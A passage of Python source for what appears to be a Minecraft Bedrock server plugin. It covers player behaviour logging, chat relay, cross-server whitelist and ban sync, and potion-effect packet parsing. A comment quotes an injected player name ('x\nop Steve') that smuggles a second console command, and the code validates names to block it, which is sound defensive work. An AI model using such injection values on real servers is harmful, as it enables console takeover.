            if rec is None:
                return
            rec.record("command", name, cmd, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(PlayerDeathEvent)
    def on_behavior_death(self, event: PlayerDeathEvent):
        """玩家死亡（仅全记录档）。"""
        if PlayerDeathEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv < 3:
                return
            name = self._pname(event)
            x, y, z, dim = self._behavior_pos(event.player)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("death", name, "", lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(PlayerTeleportEvent)
    def on_behavior_teleport(self, event: PlayerTeleportEvent):
        """传送（仅全记录档）—— 记录目的地坐标，便于排查异常位移。"""
        if PlayerTeleportEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv < 3:
                return
            name = self._pname(event)
            x = y = z = None
            dim = ""
            detail = ""
            try:
                to = event.to_location
                x, y, z = to.x, to.y, to.z
                try:
                    dim = getattr(to.dimension, "name", "") or ""
                except Exception:
                    dim = ""
                detail = f"{int(x)},{int(y)},{int(z)}"
            except Exception:
                pass
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("teleport", name, detail, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(ActorDamageEvent)
    def on_behavior_attack(self, event: ActorDamageEvent):
        """攻击（仅全记录档）—— 记录「玩家打了谁」。

        ★ 事件是 ActorDamageEvent（标注的是**被伤害的 Mob**，不是玩家）。
          攻击者要从 ``damage_source`` 取：``damaging_actor`` 是直接造成
          伤害的实体（近战=玩家本人，远程=箭/雪球），``actor`` 是起因实体
          （远程时=射箭的玩家）。两者都试、只有落在 Player 上才记，
          这样既能覆盖近战也能覆盖远程。非玩家造成的伤害直接跳过。
        """
        if ActorDamageEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv < 3:
                return
            src = getattr(event, "damage_source", None)
            attacker = None
            for attr in ("damaging_actor", "actor"):
                try:
                    a = getattr(src, attr, None)
                except Exception:
                    a = None
                if isinstance(a, Player):
                    attacker = a
                    break
            if attacker is None:
                return
            victim = getattr(event, "actor", None)
            vname = ""
            try:
                vname = str(getattr(victim, "name", "")
                            or getattr(victim, "type", "") or "")
            except Exception:
                vname = ""
            x, y, z, dim = self._behavior_pos(attacker)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("attack", str(attacker.name), vname, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(PlayerPickupItemEvent)
    def on_behavior_item_pickup(self, event: PlayerPickupItemEvent):
        """拾取物品（仅全记录档）。"""
        if PlayerPickupItemEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv < 3:
                return
            p = event.player
            iname = ""
            try:
                # PlayerPickupItemEvent.item 是掉落的 Item 实体，
                # 物品名要从它的 item_stack.type 取。
                stack = getattr(event.item, "item_stack", None)
                iname = str(getattr(stack, "type", "") or "")
            except Exception:
                iname = ""
            x, y, z, dim = self._behavior_pos(p)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("item_pickup", str(p.name), iname, lv, x, y, z, dim)
        except Exception:
            pass

    @_optional_event_handler(InventoryOpenEvent)
    def on_behavior_container(self, event: InventoryOpenEvent):
        """打开容器（仅全记录档）。

        InventoryOpenEvent 不在 endstone 0.11 的事件表里（实测 0.11.0 ~
        0.11.14 均无），是 0.11 之后才加入的类。因此本方法用
        @_optional_event_handler 装饰：事件类缺失时不会被注册，控制台也不会
        再刷「invalid event handler signature」的 ERROR；在支持该事件的版本上
        自动生效。只影响容器这一类，其余事件注册照常。
        """
        if InventoryOpenEvent is None:
            return
        try:
            lv = self._behavior_level()
            if lv < 3:
                return
            p = event.player
            detail = ""
            try:
                inv = getattr(event, "inventory", None)
                detail = str(getattr(inv, "type", "") or "")
            except Exception:
                detail = ""
            x, y, z, dim = self._behavior_pos(p)
            rec = getattr(self, "_behavior", None)
            if rec is None:
                return
            rec.record("container", str(p.name), detail, lv, x, y, z, dim)
        except Exception:
            pass

    @event_handler
    def on_player_chat(self, event: PlayerChatEvent):
        # 类型标注不能省：Endstone 在注册时会校验处理器签名，
        # 无标注会被判为 invalid event handler signature 而整条丢弃，
        # 表现为「聊天完全不通，但其他功能都正常」。
        try:
            player_name = event.player.name
            original = event.message
        except Exception:
            player_name = "未知"
            original = ""

        if original:
            self._append_message("chat", player_name, original)
            self._broadcast_official(
                "mc_to_qq", "mc_to_qq_format", "[游戏] %s：%s",
                player=player_name, message=original,
            )
            # ★ 行为记录：聊天（第 1 档起）。挂在这里而不是另注册一个
            #   @event_handler，是因为同一事件多注册一个 handler 会让
            #   Endstone 分发两次、且执行顺序无保证 —— 就地追加最简单可靠。
            #   注意只是入队，不碰磁盘（本回调在主线程上）。
            try:
                rec = self._behavior_recorder()
                if rec is not None:
                    x, y, z, dim = self._behavior_pos(event.player)
                    rec.record("chat", player_name, original,
                               self._behavior_level(), x, y, z, dim)
            except Exception:
                pass

        hub = getattr(self, "qq_hub", None)
        if hub is not None and original:
            try:
                hub.websocket_relay("chat", player=player_name, message=original)
            except Exception:
                pass

        cross = getattr(self, "cross", None)
        if cross is not None and cross.enabled() and original:
            try:
                sname = str(cross.cfg.get("server_name", "") or "本服")
                cross.send_chat(sname, player_name, original)
            except Exception:
                pass

        if getattr(self, "fun_transform", True) and original:
            try:
                transformed = _cat_transform(original)
                if transformed and transformed != original:
                    try:
                        event.message = transformed
                    except Exception:
                        try:
                            event.set_message(transformed)
                        except Exception:
                            pass
            except Exception:
                pass

        # 正则引擎的 server.player_chat 事件。
        # 放在最末尾：用 event.message（可能已被趣味转换改写）更贴近
        # 玩家实际看到的内容；而且失败也不能影响前面的互通链路。
        if original:
            self._regex_event_chat(player_name, str(getattr(event, "message", original) or original))

    def _cross_broadcast(self, msg):
        # broadcast_message(message) 只需一个参数；
        # broadcast(message, permission) 需要**两个**。原来兜底那句漏了
        # permission，所以主接口一失败，兜底也必然失败 —— 等于没有兜底。
        # 这里改用 broadcast_message 的等价能力：先试原方法，
        # 再退回「带权限名的 broadcast」，最后退回逐玩家 send_message。
        try:
            self.server.broadcast_message(msg)
            return
        except Exception:
            pass
        try:
            self.server.broadcast(msg, "endstone.broadcast.user")
            return
        except Exception:
            pass
        try:
            for p in list(self.server.online_players):
                try:
                    p.send_message(msg)
                except Exception:
                    pass
        except Exception:
            pass

    def _local_whitelist_names(self):
        """取当前服务器的白名单玩家名集合。

        Endstone 的 ``Server`` 对象**没有** ``whitelist`` 属性（0.11.10
        整个包都搜不到 whitelist API），白名单只能通过服务端指令操作。
        因此这里改走 ``allowlist list``：在**主线程**派发并把控制台
        输出抓回来解析 —— 原来读 ``getattr(self.server, "whitelist", None)``
        永远拿到 None，导致「当前名单」恒为空集，跨服同步时该删的删不掉。
        """
        out = set()
        try:
            text = self._run_in_server_thread(
                self._capture_command_output, "allowlist list", timeout=3.0
            )
        except Exception:
            return out
        if not isinstance(text, str):
            return out
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            low = line.lower()
            # 跳过提示语（"There are N whitelisted players:" / "暂无" 等）
            if low.endswith(":") or "whitelisted" in low or "player" in low and " " not in line:
                continue
            for part in line.split(","):
                name = part.strip().strip("-*").strip()
                if not name or " " in name:
                    continue
                if name.lower() in ("there", "are", "no", "whitelist", "whitelisted", "players"):
                    continue
                out.add(name)
        return out

    def _capture_command_output(self, command):
        """在主线程派发指令并抓取控制台输出（尽力而为，失败返回空串）。

        BDS 的 `allowlist list` 没有查询 API，只能解析它的回显。
        这里把 ``server.command_sender`` 的输出钩子临时替换掉 ——
        若该版本不支持替换，则退化为「只派发不抓取」并返回空串，
        调用方需要能容忍空结果（见 ``_local_whitelist_names``）。
        """
        sender = None
        try:
            sender = self.server.command_sender
        except Exception:
            return ""
        buf = []
        orig = None
        try:
            orig = getattr(sender, "send_message", None)
            if orig is None:
                raise AttributeError("no send_message")
            sender.send_message = lambda msg, *a, **k: buf.append(str(msg))
        except Exception:
            # 无法挂钩（C 扩展对象通常不允许设置属性）→ 放弃抓取
            try:
                self.server.dispatch_command(sender, command)
            except Exception:
                pass
            return ""
        try:
            self.server.dispatch_command(sender, command)
        except Exception:
            return ""
        finally:
            try:
                sender.send_message = orig
            except Exception:
                pass
        return "\n".join(buf)

    def _apply_cross_whitelist(self, names):
        if not names:
            return
        try:
            current = self._local_whitelist_names()
            target = set()
            for n in names:
                n = str(n).strip()
                if n:
                    target.add(n)
            for n in (target - current):
                try:
                    self._run_in_server_thread(self._exec_allowlist_cmd, n, "add", timeout=2.0)
                except Exception:
                    pass
            for n in (current - target):
                try:
                    self._run_in_server_thread(self._exec_allowlist_cmd, n, "remove", timeout=2.0)
                except Exception:
                    pass
        except Exception as e:
            self.logger.warning(f"[跨服] 应用白名单失败: {e}")

    def _exec_allowlist_cmd(self, name, op):
        # 同 _exec_ban_cmd：名字来自跨服对端，拼指令前必须校验，
        # 否则换行即可注入任意控制台指令。
        safe = self._safe_player_name(name)
        if safe is None:
            return
        cmd = f"allowlist add {safe}" if op == "add" else f"allowlist remove {safe}"
        try:
            self.server.dispatch_command(self.server.command_sender, cmd)
        except Exception:
            pass

    def _apply_cross_bans(self, bans):
        try:
            # 正确属性是 ``ban_list``（``bans`` 不存在；0.11.10 里
            # PlayerBanList 提供 .entries，每项有 .name）。
            current = set()
            try:
                bl = getattr(self.server, "ban_list", None)
                if bl is not None:
                    for b in bl.entries:
                        try:
                            current.add(str(b.name))
                        except Exception:
                            pass
            except Exception:
                current = set()
            target = set(bans.keys()) if isinstance(bans, dict) else set()
            for n in (target - current):
                try:
                    self._run_in_server_thread(self._exec_ban_cmd, n, "add", timeout=2.0)
                except Exception:
                    pass
            for n in (current - target):
                try:
                    self._run_in_server_thread(self._exec_ban_cmd, n, "remove", timeout=2.0)
                except Exception:
                    pass
        except Exception as e:
            self.logger.warning(f"[跨服] 应用封禁失败: {e}")

    # 合法的玩家名：BDS 允许字母/数字/下划线，加上部分插件会加空格与点。
    # 这是一条**安全边界**，宁可放宽到「看起来像名字」也不能让换行/引号进来。
    _SAFE_NAME_RE = re.compile(r"^[0-9A-Za-z_\-\. ]{1,64}$")

    def _safe_player_name(self, name):
        """校验从跨服/外部来的玩家名，不合法返回 None。

        ★ 为什么必须有这个函数
        ---------------------
        ``_exec_ban_cmd`` / ``_exec_allowlist_cmd`` 会把名字**拼进控制台指令**
        再交给 ``dispatch_command``，也就是以**控制台权限**执行。而名字来自
        跨服对端（``ban_set`` / ``wl_set`` 报文），对端只要拿到跨服口令就能
        塞进 ``"x\\nop Steve"`` 这种值 —— 换行后 BDS 会当作第二条指令执行，
        等于**远程控制台接管**（可 op / deop / stop）。

        跨服口令是多机共享、常常明文写在配置里的，泄露面比面板密码大得多，
        所以这里必须挡死，而不是「相信对端」。
        """
        s = str(name or "").strip()
        if not s:
            return None
        if not self._SAFE_NAME_RE.match(s):
            try:
                self.logger.warning(f"[跨服] 丢弃非法玩家名（疑似指令注入）: {s[:80]!r}")
            except Exception:
                pass
            return None
        return s

    def _exec_ban_cmd(self, name, op):
        safe = self._safe_player_name(name)
        if safe is None:
            return
        cmd = f"ban {safe}" if op == "add" else f"unban {safe}"
        try:
            self.server.dispatch_command(self.server.command_sender, cmd)
        except Exception:
            pass

    def _probe_bundle_nbt(self, nbt, max_depth=4):
        """把任意 NBT 结构里的「容器型路径」全部列出来，用于诊断收纳袋。

        为什么需要它：现有代码在找 ``nbt["d"]["Items"]``，但基岩版的收纳袋
        用的是 ``minecraft:storage_item`` 组件关联的**动态容器**，
        袋内物品未必以 ``Items`` 这个键名存在（用户日志里
        ``contains_items=no`` 已经证伪了这个猜测）。
        与其继续猜键名，不如把真实结构打出来，一次改对。

        返回 ``[路径, ...]``，只保留 list / dict 节点，最长 4 层，
        叶子值不打印（避免刷屏，也避免把玩家物品数据写进日志）。
        """
        found = []

        def _walk(node, path, depth):
            if depth > max_depth or len(found) >= 12:
                return
            if isinstance(node, dict):
                for k in node.keys():
                    try:
                        v = node[k]
                    except Exception:
                        continue
                    p = f"{path}.{k}" if path else str(k)
                    if isinstance(v, (dict, list)):
                        found.append(p)
                        _walk(v, p, depth + 1)
            elif isinstance(node, (list, tuple)):
                if node and isinstance(node[0], (dict, list)):
                    found.append(f"{path}[0]")
                    _walk(node[0], f"{path}[0]", depth + 1)

        try:
            _walk(nbt, "", 0)
        except Exception:
            pass
        return found

    def _cross_snapshot_item(self, stack, who=None):
        try:
            it = getattr(stack, "type", None)
            if it is None:
                it = getattr(stack, "item_type", None)
            tname = None
            if it is not None:
                try:
                    tname = str(getattr(it, "id", None) or "")
                except Exception:
                    tname = None
                if not tname:
                    try:
                        tname = str(it)
                    except Exception:
                        tname = None
                if not tname:
                    try:
                        tname = getattr(it, "name", None)
                    except Exception:
                        tname = None
            if not tname:
                try:
                    tname = str(getattr(stack, "type", None) or "")
                except Exception:
                    tname = None
            if not tname:
                return None
            nbt = None
            nbt_err = None
            try:
                nb = getattr(stack, "nbt", None)
                if nb is not None:
                    nbt = self._nbt_serialize(nb)
            except Exception as e:
                nbt = None
                nbt_err = f"{e}"
            if "bundle" in str(tname) and self._cross_experimental():
                keys = ""
                has_items = "no"
                if isinstance(nbt, dict) and isinstance(nbt.get("d"), dict):
                    keys = ",".join(str(k) for k in nbt["d"].keys())
                    if "Items" in nbt["d"]:
                        has_items = "yes"
                who_s = (" player=" + str(who)) if who else ""
                # hints 是这次新加的：把真实存在的容器路径列出来。
                # 拿到它之后就不用再猜基岩版的键名了（见 _probe_bundle_nbt）。
                hints = ",".join(self._probe_bundle_nbt(nbt)) or "none"
                self.logger.warning(
                    "[Synced][bundle] snapshot type=" + str(tname) + who_s
                    + " nbt_keys=[" + (keys or "none") + "]"
                    + " contains_items=" + has_items
                    + " nbt_is_none=" + ("yes" if nbt is None else "no")
                    + " hints=[" + hints + "]"
                )
            return {
                "t": tname,
                "c": int(getattr(stack, "amount", 1) or 1),
                "data": int(getattr(stack, "data", 0) or 0),
                "nbt": nbt,
            }
        except Exception:
            return None

    def _cross_snapshot_inventory(self, player):
        items = []
        inv = getattr(player, "inventory", None)
        if inv is None:
            return items
        who = getattr(player, "name", None)
        try:
            for i in range(40):
                try:
                    stack = inv.get_item(i)
                except Exception:
                    break
                if stack is None or getattr(stack, "amount", 0) <= 0:
                    continue
                d = self._cross_snapshot_item(stack, who=who) if who else self._cross_snapshot_item(stack)
                if d:
                    d["slot"] = i
                    items.append(d)
        except Exception:
            pass
        return items

    def _cross_snapshot_ender_chest(self, player):
        items = []
        inv = None
        try:
            inv = getattr(player, "ender_chest", None)
        except Exception:
            inv = None
        if inv is None:
            return items
        who = getattr(player, "name", None)
        try:
            size = int(getattr(inv, "size", None) or 27)
            for i in range(size):
                try:
                    stack = inv.get_item(i)
                except Exception:
                    break
                if stack is None or getattr(stack, "amount", 0) <= 0:
                    continue
                d = self._cross_snapshot_item(stack, who=who) if who else self._cross_snapshot_item(stack)
                if d:
                    d["slot"] = i
                    items.append(d)
        except Exception:
            pass
        return items

    # ---------------------------------------------------- 药水效果拦包读取
    #
    # 为什么必须拦包：
    #   Endstone 0.11.10 的 ``Actor`` / ``Mob`` / ``Player`` 上**没有**任何
    #   读取药水效果的 API（``active_effects``、``get_active_effects``、
    #   ``add_effect`` 全部零命中，``endstone.effect`` 里只有一个 EffectType
    #   常量类）。所以「读玩家身上有什么 buff」这件事，只能从协议层拿。
    #
    #   服务端每次给客户端增删改效果，都会下发 MobEffectPacket（packet id = 28）。
    #   拦下它并缓存，就是完整且实时的效果列表。
    #
    # 字段顺序（依据 PocketMine ``MobEffectPacket::decodePayload``，
    # 并对照 Mojang bedrock-protocol-docs / bedrock-rs / 官方包表，
    # payload **不含** packet header）：
    #   actor_runtime_id : uvarint64   目标实体 runtime id
    #   event_id         : u8          1=Add 2=Modify 3=Remove
    #   effect_id        : svarint     效果数字 ID（基岩版自己的表）
    #   amplifier        : svarint     等级 - 1
    #   particles        : bool(u8)
    #   duration         : svarint     剩余 tick
    #   tick             : uvarint64   开始时刻（新版协议追加）
    #   ambient          : bool(u8)    新版协议追加
    #
    # 跨版本安全性：包 id 28 在 1.21.x 各版本稳定（v898/v944/v975 均为 28），
    # 变的只是尾部字段，而尾部字段都在 duration 之后，解析到 duration 即可，
    # 多余的字节直接忽略。
    _CROSS_MOB_EFFECT_PACKET_ID = 28

    # 基岩版效果数字 ID → 命名空间 ID。
    # ★ 不能用 Java 版的编号表：基岩版从 24 起就与 Java 错位
    #   （Java 的 slow_falling 是 28，基岩版是 27）。
    _BE_EFFECT_ID = {
        1: "minecraft:speed",
        2: "minecraft:slowness",
        3: "minecraft:haste",
        4: "minecraft:mining_fatigue",
        5: "minecraft:strength",
        6: "minecraft:instant_health",
        7: "minecraft:instant_damage",
        8: "minecraft:jump_boost",
        9: "minecraft:nausea",
        10: "minecraft:regeneration",
        11: "minecraft:resistance",
        12: "minecraft:fire_resistance",
        13: "minecraft:water_breathing",
        14: "minecraft:invisibility",
        15: "minecraft:blindness",
        16: "minecraft:night_vision",
        17: "minecraft:hunger",
        18: "minecraft:weakness",
        19: "minecraft:poison",
        20: "minecraft:wither",
        21: "minecraft:health_boost",
        22: "minecraft:absorption",
        23: "minecraft:saturation",
        24: "minecraft:levitation",
        25: "minecraft:fatal_poison",
        26: "minecraft:conduit_power",
        27: "minecraft:slow_falling",
        28: "minecraft:bad_omen",
        29: "minecraft:hero_of_the_village",
        30: "minecraft:darkness",
    }

    def _read_varint(self, buf, offset, signed=False):
        """从 ``buf`` 的 ``offset`` 处读一个 varint。

        返回 ``(值, 新偏移)``；数据不足或超过 5 字节（基岩版 varint 上限）
        时抛 ValueError —— 由调用方吞掉，绝不能让异常冒到事件循环里。
        """
        result = 0
        shift = 0
        start = offset
        n = len(buf)
        while True:
            if offset >= n or shift > 35:
                raise ValueError("varint 越界")
            b = buf[offset]
            offset += 1
            result |= (b & 0x7F) << shift
            if not (b & 0x80):
                break
            shift += 7
        if signed and (result & 1):
            result = -(result >> 1) - 1
        elif signed:
            result = result >> 1
        return result, offset

    def _cross_effect_seen(self, player, payload):
        """处理一条发给玩家的 MobEffectPacket，更新该玩家的效果缓存。

        这个方法跑在 Endstone 的事件线程上，必须**极快且绝不抛异常**：
        先做一次 O(1) 的 id 判断，不匹配立刻返回。
        """
        try:
            if not payload:
                return
            rid, off = self._read_varint(payload, 0)
            if off >= len(payload):
                return
            event_id = payload[off]
            off += 1
            effect_id, off = self._read_varint(payload, off, signed=True)
            amplifier, off = self._read_varint(payload, off, signed=True)
            if off >= len(payload):
                return
            off += 1                                  # particles，用不上，跳过
            duration, off = self._read_varint(payload, off, signed=True)
        except Exception:
            return

        # 只认发给本玩家的包：服务端会把同一个包发给所有能看到该实体的人，
        # 不比对 runtime id 的话，别人身上的 buff 会被错记到本玩家头上。
        try:
            my_rid = int(getattr(player, "runtime_id", -1))
        except Exception:
            return
        if my_rid < 0 or int(rid) != my_rid:
            return

        try:
            uuid = str(getattr(player, "unique_id", None) or getattr(player, "uuid", None) or "")
        except Exception:
            return
        if not uuid:
            return

        cache = getattr(self, "_cross_effect_cache", None)
        lock = getattr(self, "_cross_effect_lock", None)
        if cache is None or lock is None:
            return
        with lock:
            bucket = cache.get(uuid)
            if bucket is None:
                bucket = {}
                cache[uuid] = bucket
            if event_id == 3:                          # Remove
                bucket.pop(int(effect_id), None)
            elif event_id in (1, 2):                   # Add / Modify
                bucket[int(effect_id)] = (int(amplifier), int(duration))
            else:
                return

    def _cross_effect_list(self, player):
        """把拦包缓存转成 ``_cross_restore_effects`` 认得的格式。

        输出形如 ``[{"t": "minecraft:slow_falling", "a": 1, "d": 1400}, ...]``，
        其中 ``a`` 是放大器（与指令里的 amplifier 同义，0 起算）、
        ``d`` 是剩余 tick（<0 表示无限）。
        """
        try:
            uuid = str(getattr(player, "unique_id", None) or getattr(player, "uuid", None) or "")
        except Exception:
            return []
        if not uuid:
            return []
        cache = getattr(self, "_cross_effect_cache", None)
        lock = getattr(self, "_cross_effect_lock", None)
        if cache is None or lock is None:
            return []
        with lock:
            bucket = dict(cache.get(uuid) or {})
        out = []
        for eid, val in bucket.items():
            tn = self._BE_EFFECT_ID.get(int(eid))
            if not tn:
                continue                              # 未知效果：宁可丢掉也不乱给
            try:
                amp, dur = val
            except Exception:
                continue
            out.append({"t": tn, "a": int(amp), "d": int(dur)})
        return out

    def _cross_tick_effect_cache(self):
        """每 tick 把缓存里所有效果的剩余时间 -1，并清理到期的。

        为什么要自己倒计时：MobEffectPacket 只在效果**发生变更**时下发，
        给 30 秒的缓降不会每 tick 都发包。不自己扣时间的话，
        一个 5 秒的 buff 过了 10 分钟还会被当成「还有 5 秒」同步过去。
        """
        if self._periodic_stopped:
            return
        cache = getattr(self, "_cross_effect_cache", None)
        lock = getattr(self, "_cross_effect_lock", None)
        if cache is None or lock is None:
            return
        with lock:
            for uuid in list(cache.keys()):
                bucket = cache.get(uuid)
                if not bucket:
                    cache.pop(uuid, None)
                    continue
                for eid in list(bucket.keys()):
                    amp, dur = bucket[eid]
                    if dur < 0:
                        continue                          # 无限时长的效果不衰减
                    dur -= 1
                    if dur <= 0:
                        bucket.pop(eid, None)
                    else:
                        bucket[eid] = (amp, dur)
                if not bucket:
                    cache.pop(uuid, None)

    @_optional_event_handler(PacketSendEvent)
    def on_cross_packet_send(self, event: PacketSendEvent) -> None:
        """拦服务端下行包，捞出药水效果。

        性能约束：这个 handler 会对**每一个**下行包执行，所以第一行就是
        id 判断，不匹配直接 return，不做任何其它取属性/加锁的动作。
        """
        if getattr(self, "_cross_effect_cache", None) is None:
            return
        try:
            if int(getattr(event, "packet_id", -1)) != self._CROSS_MOB_EFFECT_PACKET_ID:
                return
        except Exception:
            return
        try:
            player = getattr(event, "player", None)
            if player is None:
                return                              # 登录完成前可能是 None（官方文档已注明）
            self._cross_effect_seen(player, getattr(event, "payload", None))
        except Exception:
            return

    # ---------------------------------------------------- 实验板开关
    #
    # 「实验板」= 本次新增的实验性同步能力，默认**关闭**。关闭时插件行为
    # 与添加这些功能之前**完全一致**（原版跨服）：
    #   * 背包 / 末影箱 / 血量 / 经验 / 位置 → 照常同步（这些是原版就有的）
    #   * 疾跑/潜行/飞行状态 → 不采集、不恢复
    #   * buff/debuff        → 不拦包、不恢复
    #   * 收纳袋诊断日志      → 不打
    #   * 5 秒周期快照/掉线保护 → 不注册
    #
    # 关闭时**不影响已有数据**：cross_db.json 里已存的 state / effects 字段
    # 原样保留（只是不读），重新打开开关即可继续使用。

    def _cross_experimental(self):
        """实验板是否打开。任何异常都当作「关闭」，保证降级到原版行为。"""
        try:
            cross = getattr(self, "cross", None)
            if cross is None:
                return False
            fn = getattr(cross, "experimental", None)
            if fn is not None:
                return bool(fn())
            return bool((cross.cfg or {}).get("experimental", False))
        except Exception:
            return False

    def _cross_snapshot_effects(self, player):
        # ★ 实验板功能：关闭时直接返回空列表（原版行为 —— 效果本来就没同步过）。
        if not self._cross_experimental():
            return []
        # 优先走拦包缓存（见 _cross_effect_seen / _cross_effect_list）：
        # Endstone 0.11.10 的 Actor/Mob/Player 上**根本没有** active_effects /
        # get_active_effects，老的 getattr 探测永远返回空列表，
        # 于是跨服后 buff/debuff 全丢且不报任何错，
        # 现在改成从服务端下发的 MobEffectPacket 里解出来。
        if getattr(self, "_cross_effect_cache", None) is not None:
            try:
                return self._cross_effect_list(player)
            except Exception:
                pass
        # 降级路径：将来 Endstone 补上原生 API 后，这段无需改动即可生效
        out = []
        try:
            acts = getattr(player, "active_effects", None)
            if acts is None:
                try:
                    acts = getattr(player, "get_active_effects")()
                except Exception:
                    acts = None
            for ef in (acts or []):
                try:
                    tn = str(getattr(ef, "type", "") or "")
                    if not tn:
                        continue
                    amp = int(getattr(ef, "amplifier", 0) or 0)
                    dur = getattr(ef, "duration", None)
                    if dur is None or getattr(ef, "infinite", False):
                        dur = -1
                    else:
                        dur = int(dur or 0)
                    out.append({"t": tn, "a": amp, "d": dur})
                except Exception:
                    continue
        except Exception:
            pass
        return out

    def _player_attr_float(self, player, attr_name, attr_key):
        try:
            v = getattr(player, attr_name, None)
            if v is not None:
                return float(v)
        except Exception:
            pass
        try:
            # ⚠ Attribute 在 ``endstone.attribute``，**顶层没有**。
            # 写成 ``from endstone import Attribute`` 会抛 ImportError，
            # 而这里正被 try/except 兜着 —— 于是不报错、不崩溃，
            # 只是**永远读不到真实属性值**，静默失效（最难查的一类）。
            from endstone.attribute import Attribute
            ak = getattr(Attribute, attr_key, None)
            if ak is not None:
                av = getattr(player, "get_attribute", None)
                if av is not None:
                    inst = av(ak)
                    if inst is not None:
                        try:
                            return float(getattr(inst, "value", None))
                        except Exception:
                            pass
        except Exception:
            pass
        return None

    def _cross_normalize_dimension(self, raw):
        """把快照里的维度字段规整成 Endstone 认识的维度标识。

        快照可能存着三种形态：
          * ``"minecraft:overworld"`` / ``"minecraft:nether"`` / ``"minecraft:the_end"``
            （字符串，最理想）
          * Dimension 枚举对象（``str()`` 之后可能是 ``"Dimension.OVERWORLD"``）
          * 空 / None（旧快照，没有这个字段）

        取不到就返回 ``None``，由调用方退回「只传坐标」的老行为 ——
        绝不猜一个维度，猜错比不传更糟（会把玩家丢进岩浆）。
        """
        if raw is None:
            return None
        s = str(raw).strip()
        if not s:
            return None
        low = s.lower().replace(" ", "")
        # 常见别名 → 官方标识
        table = {
            "overworld": "minecraft:overworld",
            "minecraft:overworld": "minecraft:overworld",
            "dimension.overworld": "minecraft:overworld",
            "the_end": "minecraft:the_end",
            "theend": "minecraft:the_end",
            "end": "minecraft:the_end",
            "minecraft:the_end": "minecraft:the_end",
            "dimension.the_end": "minecraft:the_end",
            "dimension.theend": "minecraft:the_end",
            "nether": "minecraft:nether",
            "minecraft:nether": "minecraft:nether",
            "dimension.nether": "minecraft:nether",
        }
        if low in table:
            return table[low]
        # 已经是带命名空间的标识就直接用
        if ":" in s:
            return s
        return None

    def _cross_snapshot_player(self, player):
        try:
            loc = getattr(player, "location", None)
            pos = None
            if loc is not None:
                try:
                    # 维度要从**多个来源**里依次试：Dimension 对象上一般有
                    # ``name`` / ``value``（形如 "minecraft:the_end"），
                    # 直接 str() 有时只能得到 "Dimension.THE_END"。
                    # 这里优先取结构化字段，都取不到才退回 str()。
                    _dim = ""
                    for _src in (loc, player):
                        for _attr in ("dimension", "dimension_id"):
                            try:
                                _d = getattr(_src, _attr, None)
                            except Exception:
                                _d = None
                            if _d is None:
                                continue
                            for _f in ("name", "value"):
                                _v = getattr(_d, _f, None)
                                if _v:
                                    _dim = str(_v)
                                    break
                            if not _dim:
                                _dim = str(_d)
                            if _dim:
                                break
                        if _dim:
                            break
                    pos = {"x": loc.x, "y": loc.y, "z": loc.z, "dim": _dim}
                except Exception:
                    pos = None
            inv = []
            ec = []
            eff = []
            try:
                inv = self._cross_snapshot_inventory(player)
            except Exception:
                inv = []
            try:
                ec = self._cross_snapshot_ender_chest(player)
            except Exception:
                ec = []
            try:
                eff = self._cross_snapshot_effects(player)
            except Exception:
                eff = []
            xp = getattr(player, "exp_level", None)
            if xp is None:
                lv = getattr(player, "level", None)
                if isinstance(lv, (int, float)) and not hasattr(lv, "x"):
                    xp = lv
            # ---- 玩家运动/姿态状态（实验板功能，关闭时不采集）----
            # 这几项 Endstone 一直是有的（Player 上带 getter+setter），
            # 但以前既没进快照、也没写回，所以跨服后疾跑/潜行/飞行**必丢**。
            # 注意：写入时**必须判断「键存在」**，不能用 data.get(k, False)，
            # 否则旧快照（没有这些键）会把玩家状态强行改成 False。
            mob_state = {}
            if self._cross_experimental():
                for _k, _name in (
                    ("is_sprinting", "is_sprinting"),
                    ("is_sneaking", "is_sneaking"),
                    ("is_flying", "is_flying"),
                    ("allow_flight", "allow_flight"),
                ):
                    try:
                        _v = getattr(player, _name, None)
                    except Exception:
                        _v = None
                    if _v is not None:
                        mob_state[_k] = bool(_v)
                try:
                    _fs = getattr(player, "fly_speed", None)
                except Exception:
                    _fs = None
                if _fs is not None:
                    try:
                        mob_state["fly_speed"] = float(_fs)
                    except Exception:
                        pass
            return {
                "health": getattr(player, "health", None),
                "max_health": getattr(player, "max_health", None),
                "absorption": self._player_attr_float(player, "absorption", "ABSORPTION"),
                "food": self._player_attr_float(player, "hunger", "PLAYER_HUNGER"),
                "saturation": self._player_attr_float(player, "saturation", "PLAYER_SATURATION"),
                "game_mode": str(getattr(player, "game_mode", "") or ""),
                "xp": xp,
                "xp_progress": getattr(player, "exp_progress", None),
                "total_xp": getattr(player, "total_exp", None),
                "walk_speed": getattr(player, "walk_speed", None),
                "position": pos,
                "inventory": inv,
                "ender_chest": ec,
                "effects": eff,
                "state": mob_state,
            }
        except Exception:
            return {}

    def _effect_cls(self):
        if getattr(self, "_effect_cls_cache", None) is None:
            cls = None
            for mod in ("endstone.potion", "endstone.effect"):
                try:
                    m = __import__(mod, fromlist=["Effect"])
                    cls = getattr(m, "Effect")
                    if cls:
                        break
                except Exception:
                    cls = None
            self._effect_cls_cache = cls
        return self._effect_cls_cache

    def _nbt_serialize(self, tag):
        if tag is None:
            return None
        try:
            cls = type(tag).__name__
            if cls == "CompoundTag":
                d = {}
                try:
                    for k, v in tag.items():
                        d[str(k)] = self._nbt_serialize(v)
                except Exception:
                    try:
                        for k in list(tag.keys()):
                            d[str(k)] = self._nbt_serialize(tag[k])
                    except Exception:
                        pass
                return {"T": "C", "d": d}
            if cls == "ListTag":
                lst = []
                try:
                    n = tag.size()
                except Exception:
                    n = 0
                for i in range(n):
                    try:
                        lst.append(self._nbt_serialize(tag[i]))
                    except Exception:
                        lst.append(None)
                return {"T": "L", "d": lst}
            if cls == "ByteArrayTag":
                try:
